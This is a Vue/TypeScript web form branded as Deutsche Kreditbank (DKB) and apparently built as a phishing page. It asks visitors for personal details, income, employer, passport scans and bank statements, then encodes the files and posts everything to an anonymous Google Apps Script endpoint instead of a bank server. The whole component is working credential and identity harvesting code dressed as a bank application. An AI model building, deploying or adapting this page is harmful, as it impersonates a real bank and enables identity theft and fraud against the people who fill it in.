<script setup lang="ts">
import { ref } from "vue";
import { useI18n } from "vue-i18n";
import LogoDkb from "@/assets/logo_dkb.svg";
import LogoDkbPng from "@/assets/logo_dkb.png";
import ModalBook2 from "@/assets/MODAL_BOOK_2.jpg";
import ModalBook from "@/assets/MODAL_BOOK.svg";


const form = ref({
  firstName: "",
  lastName: "",
  dateOfBirth: "",
  countryOfBirth: "",
  countryOfResidence: "",
  income: "",
  incomeCurrency: "EUR",
  additionalIncome: "",
  additionalIncomeCurrency: "EUR",
  email: "",
  phone: "+",
  additionalPhone: "+",
  residentialAddress: "",
  workplace: "",
  position: "",
  workStartYear: "",
  passportFile: null as File | null,
  bankStatementFile: null as File | null,
});

const { t, locale } = useI18n();
const changeLanguage = (lang: string) => {
  locale.value = lang;
  sessionStorage.setItem('lang', lang);
};
const getLanguageLabel = () => {
  return locale.value === 'de' ? 'DE' : 'EN';
};

const hasAdditionalIncome = ref(false);
const hasAdditionalPhone = ref(false);

const isSubmitting = ref(false);
const errorMessage = ref("");
const success = ref(false);
const showSuccessDialog = ref(false);

const GOOGLE_SCRIPT_URL =
  "https://script.google.com/macros/s/AKfycbxErR5IUh3dXvThX_hc9IrYU3Zk-zz0KT5yKYNGM0RHBextiJhhzO4HCuZLXfaHrw/exec";
function getMaxBirthDate(): string {
  const today = new Date();
  const d = new Date(
    today.getFullYear() - 18,
    today.getMonth(),
    today.getDate()
  );
  const yyyy = d.getFullYear();
  const mm = String(d.getMonth() + 1).padStart(2, "0");
  const dd = String(d.getDate()).padStart(2, "0");
  return `${yyyy}-${mm}-${dd}`;
}

const currentYear = new Date().getFullYear();
function handleNameInput(field: "firstName" | "lastName", e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  value = value.replace(/[^A-Za-zА-Яа-яЁё\s'-]/g, "");
  form.value[field] = value;
}
function handleLettersOnlyInput(
  field: "countryOfBirth" | "countryOfResidence" | "residentialAddress",
  e: Event
) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  value = value.replace(/[0-9]/g, "");
  form.value[field] = value;
}
function handlePhoneInput(e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  value = value.replace(/[^\d+]/g, "");
  if (!value.startsWith("+")) {
    value = "+" + value.replace(/\D/g, "");
  } else {
    const digitsPart = value.slice(1).replace(/\D/g, "");
    value = "+" + digitsPart;
  }
  const digits = value.slice(1).replace(/\D/g, "");
  form.value.phone = "+" + digits;
}

function additionalPhoneInput(e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  value = value.replace(/[^\d+]/g, "");

  if (!value.startsWith("+")) {
    value = "+" + value.replace(/\D/g, "");
  } else {
    const digitsPart = value.slice(1).replace(/\D/g, "");
    value = "+" + digitsPart;
  }
  const digits = value.slice(1).replace(/\D/g, "");
  form.value.additionalPhone = "+" + digits;
}

function handleWorkplaceInput(e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  if (value.length > 50) value = value.slice(0, 50);
  form.value.workplace = value;
}

function handlePositionInput(e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  if (value.length > 25) value = value.slice(0, 25);
  form.value.position = value;
}
function handleFileChange(e: Event, key: "passportFile" | "bankStatementFile") {
  const target = e.target as HTMLInputElement;
  if (!target.files || !target.files[0]) return;
  // всегда храним только один файл — новый заменяет старый
  form.value[key] = target.files[0];
}
function fileToBase64(file: File | null): Promise<string | null> {
  if (!file) return Promise.resolve(null);
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => {
      const result = String(reader.result || "");
      const base64 = result.includes(",") ? result.split(",")[1] : result;
      resolve(base64);
    };
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}
async function onSubmit() {
  try {
    errorMessage.value = "";
    success.value = false;
    if (!form.value.passportFile || !form.value.bankStatementFile) {
      errorMessage.value = t('quiz.errors.uploadBothFiles');
      return;
    }
    if (!form.value.dateOfBirth) {
      errorMessage.value = t('quiz.errors.selectDateOfBirth');
      return;
    }
    const dob = new Date(form.value.dateOfBirth);
    const minDob = new Date(getMaxBirthDate());
    if (dob > minDob) {
      errorMessage.value = t('quiz.errors.mustBe18');
      return;
    }
    const incomeNum = Number(form.value.income || 0);
    if (Number.isNaN(incomeNum) || incomeNum < 0) {
      errorMessage.value = t('quiz.errors.incomeInvalid');
      return;
    }

    let additionalIncomeStr = "";
    let additionalIncomeCurrencyStr = "";
    if (hasAdditionalIncome.value) {
      const addNum = Number(form.value.additionalIncome || 0);
      if (Number.isNaN(addNum) || addNum < 0) {
        errorMessage.value = t('quiz.errors.additionalIncomeInvalid');
        return;
      }
      additionalIncomeStr = String(addNum);
      additionalIncomeCurrencyStr = form.value.additionalIncomeCurrency;
    }
    const phoneDigits = form.value.phone.replace(/\D/g, "");
    if (!form.value.phone.startsWith("+") || phoneDigits.length === 0) {
      errorMessage.value = t('quiz.errors.phoneInvalid');
      return;
    }
    const yearNum = Number(form.value.workStartYear);
    if (
      Number.isNaN(yearNum) ||
      yearNum < 1925 ||
      yearNum > currentYear
    ) {
      errorMessage.value = t('quiz.errors.workStartYearInvalid', { year: currentYear });
      return;
    }

    isSubmitting.value = true;

    const passportBase64 = await fileToBase64(form.value.passportFile);
    const bankStatementBase64 = await fileToBase64(
      form.value.bankStatementFile
    );

    const payload = {
      first_name: form.value.firstName,
      last_name: form.value.lastName,
      date_of_birth: form.value.dateOfBirth,
      country_of_birth: form.value.countryOfBirth,
      country_of_residence: form.value.countryOfResidence,
      income: String(incomeNum),
      income_currency: form.value.incomeCurrency,
      additional_income: additionalIncomeStr,
      additional_income_currency: additionalIncomeCurrencyStr,
      email: form.value.email,
      phone: form.value.phone,
      additional_phone: hasAdditionalPhone.value
        ? form.value.additionalPhone
        : "",      
      residential_address: form.value.residentialAddress,
      workplace: form.value.workplace,
      position: form.value.position,
      work_start_year: String(yearNum),
      passport_file: passportBase64,
      bank_statement_file: bankStatementBase64,
    };
    const formData = new FormData();
    (Object.entries(payload) as [string, unknown][]).forEach(([key, value]) => {
      formData.append(key, value != null ? String(value) : "");
    });
    if (form.value.passportFile) {
      formData.append("passport_file_name", form.value.passportFile.name);
      formData.append("passport_file_type", form.value.passportFile.type);
    }

    if (form.value.bankStatementFile) {
      formData.append(
        "bank_statement_file_name",
        form.value.bankStatementFile.name
      );
      formData.append(
        "bank_statement_file_type",
        form.value.bankStatementFile.type
      );
    }
    const res = await fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      body: formData,
    });

    if (!res.ok) throw new Error("Request failed");
    const data = await res.json();
    if (!data.success) throw new Error("Script error");

    success.value = true;
    showSuccessDialog.value = true;
  } catch (e) {
    console.error(e);
    errorMessage.value = t('quiz.errors.somethingWentWrong');
  } finally {
    isSubmitting.value = false;
  }
}
</script>

<template>
  <main class="min-h-screen flex flex-col bg-[#f2f6fb]">
    <header class="bg-white border-b border-slate-200">
      <div
        class="max-w-5xl mx-auto flex items-center justify-between px-4 py-4 md:py-5"
      >
        <div class="flex justify-between gap-3 my-4 w-full align-center">
          <img :src="LogoDkb" alt="DKB" class="h-14 w-auto" />
          <!-- <p class="tetx-[18px] text-[#006AC7] font-medium">FAQ</p> -->
        </div>
        <div class="flex gap-8">
            <v-btn
              variant="text"
              append-icon="mdi-chevron-down"
              rounded="lg"
              class="font-semibold text-xs sm:text-base uppercase text-[#006AC7] pt-2"
            >
              {{ getLanguageLabel() }}
              <v-menu activator="parent">
                <v-list>
                  <v-list-item
                    title="DE"
                    class="uppercase"
                    @click="changeLanguage('de')"
                  />
                  <v-list-item
                    title="EN"
                    class="uppercase"
                    @click="changeLanguage('en')"
                  />
                </v-list>
              </v-menu>
            </v-btn>
      </div>
      </div>
    </header>
    <div class="flex-1">
      <div class="max-w-5xl mx-auto px-4 py-10">
        <div class="mb-8">
          <h1 class="mt-2 text-3xl font-semibold text-slate-900">
            {{ $t('quiz.title') }}
          </h1>
          <p class="mt-2 text-sm text-slate-600 max-w-2xl">
            <b>{{ $t('quiz.subtitle') }}</b>
          </p>
        </div>

        <form
          class="bg-white rounded-lg shadow-sm border border-slate-100 p-6 md:p-8"
          @submit.prevent="onSubmit"
        >
          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.firstName') }} *
              </label>
              <input
                :value="form.firstName"
                @input="(e) => handleNameInput('firstName', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.lastName') }} *
              </label>
              <input
                :value="form.lastName"
                @input="(e) => handleNameInput('lastName', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.dateOfBirth') }} *
              </label>
              <input
                v-model="form.dateOfBirth"
                type="date"
                :max="getMaxBirthDate()"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.countryOfBirth') }} *
              </label>
              <input
                :value="form.countryOfBirth"
                @input="(e) => handleLettersOnlyInput('countryOfBirth', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.countryOfResidence') }} *
              </label>
              <input
                :value="form.countryOfResidence"
                @input="(e) => handleLettersOnlyInput('countryOfResidence', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div class="flex flex-col">
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.income') }} *
              </label>
              <div class="flex gap-2">
                <input
                  v-model="form.income"
                  type="number"
                  min="0"
                  step="0.01"
                  required
                  class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                />
                <select
                  v-model="form.incomeCurrency"
                  class="rounded-md border border-slate-300 bg-slate-50 px-2 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                >
                  <option value="EUR">EUR</option>
                  <option value="USD">USD</option>
                  <option value="GBP">GBP</option>
                  <option value="CHF">CHF</option>
                  <option value="SEK">SEK</option>
                  <option value="NOK">NOK</option>
                  <option value="DKK">DKK</option>
                </select>
              </div>
            </div>
            <div class="flex flex-col">
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.additionalIncome') }}
              </label>
              <div class="flex items-center gap-4 text-sm mb-2">
                <label class="inline-flex items-center gap-1">
                  <input
                    type="radio"
                    class="h-4 w-4"
                    :checked="hasAdditionalIncome"
                    @change="hasAdditionalIncome = true"
                  />
                  <span>{{ $t('quiz.yes') }}</span>
                </label>
                <label class="inline-flex items-center gap-1">
                  <input
                    type="radio"
                    class="h-4 w-4"
                    :checked="!hasAdditionalIncome"
                    @change="
                      hasAdditionalIncome = false;
                      form.additionalIncome = '';
                    "
                  />
                  <span>{{ $t('quiz.no') }}</span>
                </label>
              </div>

              <div v-if="hasAdditionalIncome" class="flex gap-2">
                <input
                  v-model="form.additionalIncome"
                  type="number"
                  min="0"
                  step="0.01"
                  class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  :placeholder="$t('quiz.additionalIncomePlaceholder')"
                />
                <select
                  v-model="form.additionalIncomeCurrency"
                  class="rounded-md border border-slate-300 bg-slate-50 px-2 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                >
                  <option value="EUR">EUR</option>
                  <option value="USD">USD</option>
                  <option value="GBP">GBP</option>
                  <option value="CHF">CHF</option>
                  <option value="SEK">SEK</option>
                  <option value="NOK">NOK</option>
                  <option value="DKK">DKK</option>
                </select>
              </div>
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.email') }} *
              </label>
              <input
                v-model="form.email"
                type="email"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.contactPhone') }} *
              </label>
              <input
                :value="form.phone"
                @input="handlePhoneInput"
                type="tel"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="+12345678901"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.handlePhoneInput') }} *
              </label>
              <input
                :value="form.additionalPhone"
                @input="additionalPhoneInput"
                type="tel"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="+12345678901"
              />
            </div>
            <div class="md:col-span-2">
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.residentialAddress') }} *
              </label>
              <input
                :value="form.residentialAddress"
                @input="(e) => handleLettersOnlyInput('residentialAddress', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.workplace') }} *
              </label>
              <input
                :value="form.workplace"
                @input="handleWorkplaceInput"
                type="text"
                required
                maxlength="50"
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.position') }} *
              </label>
              <input
                :value="form.position"
                @input="handlePositionInput"
                type="text"
                required
                maxlength="25"
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.workStartYear') }} *
              </label>
              <input
                v-model="form.workStartYear"
                type="number"
                :min="1925"
                :max="currentYear"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.passportUpload') }} *
              </label>
              <label
                class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
              >
                <span>
                  {{ $t('quiz.clickToChooseFile') }}<br />
                  <span class="text-[10px] text-slate-400">
                    {{ $t('quiz.fileFormats') }}
                  </span>
                </span>
                <input
                  type="file"
                  class="hidden"
                  accept=".pdf,.jpg,.jpeg,.png"
                  @change="(e) => handleFileChange(e, 'passportFile')"
                />
              </label>
              <p v-if="form.passportFile" class="mt-1 text-xs text-slate-500">
                {{ $t('quiz.selected') }} {{ form.passportFile.name }}
              </p>
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t('quiz.bankStatementUpload') }} *
              </label>
              <label
                class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
              >
                <span>
                  {{ $t('quiz.clickToChooseFile') }}<br />
                  <span class="text-[10px] text-slate-400">
                    {{ $t('quiz.fileFormats') }}
                  </span>
                </span>
                <input
                  type="file"
                  class="hidden"
                  accept=".pdf,.jpg,.jpeg,.png"
                  @change="(e) => handleFileChange(e, 'bankStatementFile')"
                />
              </label>
              <p
                v-if="form.bankStatementFile"
                class="mt-1 text-xs text-slate-500"
              >
                {{ $t('quiz.selected') }} {{ form.bankStatementFile.name }}
              </p>
            </div>
          </div>

          <div class="mt-6 space-y-2">
            <p v-if="errorMessage" class="text-sm text-red-600">
              {{ errorMessage }}
            </p>
          </div>

          <div class="mt-6 flex justify-end">
            <button
              type="submit"
              :disabled="isSubmitting"
              class="inline-flex items-center justify-center rounded-md bg-[#007bff] px-10 py-3 text-sm font-semibold text-white hover:bg-[#0067d4] disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {{ isSubmitting ? $t('quiz.sending') : $t('quiz.next') }}
            </button>
          </div>
        </form>
      </div>
    </div>

    <footer class="mt-8 bg-[#002E5C] text-white">
      <div
        class="max-w-5xl mx-auto px-4 py-10 flex flex-col md:flex-row items-center md:items-stretch gap-8"
      >
        <div class="flex gap-4">
          <div
            class="h-28 w-24 flex items-center justify-center bg-white rounded-sm overflow-hidden"
          >
            <img :src="ModalBook2" alt="" class="h-full w-full object-cover" />
          </div>
          <div
            class="h-28 w-24 flex items-center justify-center bg-white rounded-sm overflow-hidden"
          >
            <img :src="ModalBook" alt="" class="h-full w-full object-contain" />
          </div>
        </div>

        <div class="flex-1 text-center md:text-left">
          <p class="text-2xl font-semibold leading-snug">
            {{ $t('quiz.needHelp') }}
          </p>
          <p class="mt-3 text-sm text-white/80">
            {{ $t('quiz.faqDescription') }}
          </p>
        </div>

        <div class="flex items-center justify-center md:justify-end">
          <img :src="LogoDkbPng" alt="DKB" class="h-16 w-auto" />
        </div>
      </div>

      <div class="border-t border-white/10">
        <div
          class="max-w-5xl mx-auto px-4 py-4 text-[11px] text-white/70 flex flex-wrap gap-x-6 gap-y-2"
        >
          <span>© 2025 Deutsche Kreditbank AG</span>
          <span>BIC: BYLADEM1001</span>
          <span class="underline underline-offset-2 cursor-pointer">
            {{ $t('quiz.contact') }}
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            {{ $t('quiz.imprint') }}
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            {{ $t('quiz.dataProtection') }}
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            {{ $t('quiz.cookieSettings') }}
          </span>
        </div>
      </div>
    </footer>

    <v-dialog v-model="showSuccessDialog" max-width="500" persistent>
      <v-card>
        <v-card-title class="text-h5 pa-6 pb-4">
          {{ $t('quiz.successDialogTitle') }}
        </v-card-title>
        <v-card-text class="pa-6 pt-2 pb-4">
          <p class="text-body-1">
            {{ $t('quiz.successDialogMessage') }}
          </p>
        </v-card-text>
        <v-card-actions class="pa-6 pt-2">
          <v-spacer></v-spacer>
          <v-btn
            color="primary"
            variant="flat"
            @click="showSuccessDialog = false"
          >
            {{ $t('quiz.close') }}
          </v-btn>
        </v-card-actions>
      </v-card>
    </v-dialog>
  </main>
</template>
